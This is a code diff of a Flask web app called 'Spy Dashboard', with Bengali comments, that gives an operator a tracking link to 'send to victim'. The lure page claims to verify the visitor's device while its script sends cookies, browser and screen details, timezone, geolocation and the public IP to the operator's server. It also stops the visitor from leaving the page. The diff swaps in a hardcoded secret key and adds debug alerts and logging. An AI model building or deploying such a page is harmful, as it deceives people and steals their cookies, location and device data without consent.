@@ -2,22 +2,20 @@
 import os
 import uuid
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect, session, jsonify
+from flask import Flask, request, render_template_string, redirect, session
 
 app = Flask(__name__)
-app.secret_key = os.environ.get('SECRET_KEY', 'default-secret-key-change-it')
+app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
-#   ()
 reports = {}
 
-#  HTML
+# ড্যাশবোর্ড HTML (সহজ)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <title>Spy Dashboard</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
         .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
@@ -30,19 +28,19 @@ DASHBOARD_HTML = """
 </head>
 <body>
 <div class="card">
-    <h2> SPY DASHBOARD</h2>
+    <h2>📡 SPY DASHBOARD</h2>
     <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
     </div>
     <form method="post" action="/new_uid" style="display:inline;">
-        <button type="submit" style="background:#ff3366;"> Generate New Link (New UID)</button>
+        <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
     </form>
-    <p> Send current link to victim. Data stays with this UID until you create a new one.</p>
+    <p>⚠️ Send current link to victim. Data automatically appears here.</p>
 </div>
 <div class="card">
-    <h3> Received Data (UID: {{ uid }})</h3>
+    <h3>📥 Received Data (UID: {{ uid }})</h3>
     <button onclick="location.reload()">Refresh</button>
     <div id="data">
         {% if reports[uid] and reports[uid].data %}
@@ -53,7 +51,7 @@ DASHBOARD_HTML = """
                 </div>
             {% endfor %}
         {% else %}
-            <p> No data yet. Send the link to victim.</p>
+            <p>⏳ No data yet. Send the link to victim.</p>
         {% endif %}
     </div>
 </div>
@@ -70,7 +68,7 @@ DASHBOARD_HTML = """
 </html>
 """
 
-#   ( )
+# ভিকটিম পেজ (ডিবাগ সংস্করণ, যেখানে অ্যালার্ট দেখাবে এবং কনসোল লগ করবে)
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -80,65 +78,70 @@ SPY_PAGE_HTML = """
     <style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style>
 </head>
 <body>
-    <h2> Secure connection established</h2>
+    <h2>🔐 Secure connection established</h2>
     <p>Please wait while we verify your device...</p>
     <script>
-        (async function() {
-            const server = "{{ server }}";
-            const uid = "{{ uid }}";
+        (function() {
+            // স্পষ্টভাবে server URL বের করা
+            var server = window.location.origin;
+            var uid = "{{ uid }}";
+            console.log("Spy page loaded. Origin:", server, "UID:", uid);
+            alert("Debug: Page loaded. Sending data to " + server);
             
-            async function sendData(data) {
-                try {
-                    const response = await fetch(server + '/api/report/' + uid, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data)
-                    });
+            function sendData(data) {
+                var url = server + '/api/report/' + uid;
+                console.log("Attempting to send to:", url, data);
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(function(response) {
+                    console.log("Response status:", response.status);
                     if (response.ok) {
-                        console.log('Data sent successfully');
+                        alert("Data sent successfully!");
                     } else {
-                        console.error('Failed to send data, status:', response.status);
+                        alert("Server returned status: " + response.status);
                     }
-                } catch(e) {
-                    console.error('Fetch error:', e);
-                }
+                })
+                .catch(function(error) {
+                    console.error("Fetch error:", error);
+                    alert("Fetch failed: " + error.message);
+                });
             }
             
-            // Basic information
-            let info = {
+            // পাঠানোর তথ্য
+            var info = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
-                colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: document.cookie,
                 localStorageSize: localStorage.length,
                 url: window.location.href,
                 timestamp: new Date().toISOString()
             };
-            await sendData(info);
+            sendData(info);
             
-            // Geolocation (if permitted)
+            // লোকেশন (অনুমতি সাপেক্ষে)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    position => {
-                        sendData({ location: { lat: position.coords.latitude, lon: position.coords.longitude } });
+                    function(pos) {
+                        sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
                     },
-                    error => console.log("Geolocation denied")
+                    function(err) { console.log("Geolocation error", err); }
                 );
             }
             
-            // Public IP
-            try {
-                let ipRes = await fetch('https://api.ipify.org?format=json');
-                let ipData = await ipRes.json();
-                await sendData({ ip: ipData.ip });
-            } catch(e) { console.log("IP fetch failed"); }
-            
-            // Keep page busy so victim stays longer
+            // আইপি
+            fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(ipData) { sendData({ ip: ipData.ip }); })
+                .catch(function(e) { console.log("IP fetch failed", e); });
+                
+            // পেজ বন্ধ করতে না দেওয়ার কৌশল
             window.onbeforeunload = function() { return true; };
-            setInterval(() => { history.pushState({}, '', '/'); }, 1000);
         })();
     </script>
 </body>
@@ -153,27 +156,25 @@ def home():
 def dashboard():
     if 'uid' not in session:
         session['uid'] = str(uuid.uuid4())[:8]
-        if session['uid'] not in reports:
-            reports[session['uid']] = {'data': []}
+        reports[session['uid']] = {'data': []}
     uid = session['uid']
-    # Ensure reports entry exists
     if uid not in reports:
         reports[uid] = {'data': []}
+    # লিংক তৈরি
     link = request.host_url.rstrip('/') + '/spy/' + uid
     return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)
 
 @app.route('/new_uid', methods=['POST'])
 def new_uid():
     session['uid'] = str(uuid.uuid4())[:8]
-    if session['uid'] not in reports:
-        reports[session['uid']] = {'data': []}
+    reports[session['uid']] = {'data': []}
     return redirect('/dashboard')
 
 @app.route('/spy/<uid>')
 def spy(uid):
     if uid not in reports:
         reports[uid] = {'data': []}
-    return render_template_string(SPY_PAGE_HTML, server=request.host_url.rstrip('/'), uid=uid)
+    return render_template_string(SPY_PAGE_HTML, uid=uid)
 
 @app.route('/api/report/<uid>', methods=['POST'])
 def report(uid):
@@ -181,17 +182,14 @@ def report(uid):
         reports[uid] = {'data': []}
     try:
         data = request.get_json()
-        if data is None:
-            data = {"error": "No JSON received"}
+        print(f"[LOG] Data for {uid}: {data}")  # রেন্ডার লগে দেখাবে
     except Exception as e:
         data = {"error": str(e)}
     reports[uid]['data'].append({
         'time': datetime.now().strftime('%H:%M:%S'),
         'data': data
     })
-    # Also print to console for debugging (will appear in render logs)
-    print(f"[DEBUG] Data received for UID {uid}: {data}")
-    return jsonify({"status": "ok"}), 200
+    return "OK", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
